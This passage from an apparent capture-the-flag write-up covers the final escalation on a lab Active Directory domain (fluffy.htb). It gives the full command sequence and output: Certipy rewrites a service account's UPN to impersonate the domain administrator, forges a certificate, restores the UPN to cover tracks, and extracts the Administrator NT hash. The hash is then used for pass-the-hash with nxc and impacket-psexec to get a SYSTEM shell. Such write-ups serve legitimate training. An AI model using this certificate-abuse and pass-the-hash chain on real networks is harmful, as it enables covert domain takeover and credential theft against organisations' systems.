To escalate privileges without triggering typical alerts or relying on credential reuse, we used <code>Certipy</code> to modify the <code>userPrincipalName</code> (UPN) attribute of <code>CA_SVC</code> — a user with certificate enrollment rights. By setting the UPN to <code>administrator@fluffy.htb</code><span class="codefix">,</span> we effectively crafted a forged identity tied to an administrative principal. This manipulation allows the issued certificate to impersonate the domain administrator during certificate-based authentication, creating a seamless and covert escalation path.
</p>

```
~$ certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip <IP> -upn 'administrator@fluffy.htb' -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator@fluffy.htb
[*] Successfully updated 'ca_svc'
```

<p class="indent-paragraph">
With the <code>userPrincipalName</code> of <code>CA_SVC</code> set to <code>administrator@fluffy.htb</code><span class="codefix">,</span> we proceeded to request a certificate impersonating the domain administrator. Using <code>Certipy</code> with the <code>User</code> template and authenticated via NT hash, the tool successfully issued a certificate with the forged UPN. The generated certificate was saved locally as <code>administrator.pfx</code><span class="codefix">.</span> Although the certificate lacks a valid object SID — which can limit certain attacks — it remains fully capable of authenticating as <code>administrator</code> for Kerberos-based interactions, enabling a stealthy privilege escalation without relying on password cracking or hash injection.
</p>

```
~$ certipy-ad req -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip <IP> -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fluffy.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

<p class="indent-paragraph">
After successfully obtaining a forged certificate for <code>administrator@fluffy.htb</code><span class="codefix">,</span> we restored the original <code>userPrincipalName</code> of the <code>CA_SVC</code> account to <code>ca_svc@fluffy.htb</code> to maintain operational stealth and integrity within the domain environment<span class="codefix">.</span> This cleanup step ensures that no visible artifacts or identity inconsistencies remain on the compromised service account, preserving its appearance and functionality for future access if needed.
</p>

```
~$ certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip <IP> -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

<p class="indent-paragraph">
With the forged certificate tied to the impersonated <code>administrator@fluffy.htb</code> identity, we authenticated to the domain using <code>Certipy's auth</code> module in certificate mode<span class="codefix">.</span> This process established a Kerberos session for the domain administrator without requiring credentials or NT hashes, leveraging the generated <code>administrator.pfx</code> file<span class="codefix">.</span> Upon successful authentication, the tool issued a valid TGT and retrieved the <code>NT hash</code> of the <code>Administrator</code> account, thereby granting us full control over the domain<span class="codefix">.</span> The extracted hash was later used for post-exploitation actions such as lateral movement and interactive sessions.
</p>

```
~$ certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip <IP>
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@fluffy.htb'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

<p class="indent-paragraph">
To confirm the successful privilege escalation, we authenticated to the domain controller over SMB using the recovered <code>NT hash</code> of the <code>Administrator</code> account<span class="codefix">.</span> The <code>nxc</code> tool validated the credentials and reported <strong>(Pwn3d!)</strong><span class="codefix">,</span> indicating full administrative access to the system<span class="codefix">.</span> This final step confirmed that the previously issued certificate allowed for complete domain compromise without any user interaction or password reuse, demonstrating a stealthy and highly effective escalation path via Active Directory Certificate Services (ADCS).
</p>

```
~$ nxc smb dc.fluffy.htb -u administrator -H '8da83a3fa618b6e3a00e93f676c92a6e'
SMB         <IP>     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
SMB         <IP>     445    DC01             [+] fluffy.htb\administrator:8da83a3fa618b6e3a00e93f676c92a6e (Pwn3d!)
```

<p class="indent-paragraph">
With the NT hash of <code>Administrator</code> extracted and validated, we concluded the privilege escalation chain by executing <code>psexec</code> over SMB using Impacket’s toolkit. By supplying the recovered hash and targeting the domain controller <code>dc.fluffy.htb</code><span class="codefix">,</span> we were able to spawn a fully interactive SYSTEM shell under the context of the domain administrator. This method allowed us to bypass interactive login restrictions and directly execute commands on the host. Once inside the session, we navigated to the Administrator's desktop and successfully retrieved the final flag <code>root.txt</code><span class="codefix">,</span> confirming complete compromise of the target domain controller.
</p>

```
~$ impacket-psexec -hashes :8da83a3fa618b6e3a00e93f676c92a6e FLUFFY.HTB/Administrator@dc.fluffy.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.fluffy.htb.....
[*] Found writable share ADMIN$
[*] Uploading file voYgJOsM.exe
[*] Opening SVCManager on dc.fluffy.htb.....
[*] Creating service hPKF on dc.fluffy.htb.....
[*] Starting service hPKF.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.6893]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 3DE7-5FBC

 Directory of C:\Users\Administrator\Desktop

05/19/2025  03:31 PM    <DIR>          .
05/19/2025  03:31 PM    <DIR>          ..
07/15/2025  04:02 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   9,219,903,488 bytes free

C:\Users\Administrator\Desktop> type root.txt
******************************
```



